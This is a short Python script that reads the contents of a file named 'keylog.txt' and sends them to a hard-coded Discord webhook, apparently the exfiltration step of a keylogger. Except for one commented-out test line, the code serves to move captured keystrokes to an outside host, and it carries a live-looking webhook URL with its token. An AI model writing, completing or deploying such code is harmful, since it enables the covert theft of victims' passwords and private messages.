from dhooks import Webhook


webhook = Webhook ("https://discord.com/api/webhooks/1403879249550643331/PkMQvk-fo0oxhsXNMTwoTkFMy_gGN6KIfk8NRFnvxgppHDeQTEfAspy-LHw2-K3dKiPb")

with open("keylog.txt", "r") as file:
    content = file.read()

#data = "hello world test!"

webhook.send(content)



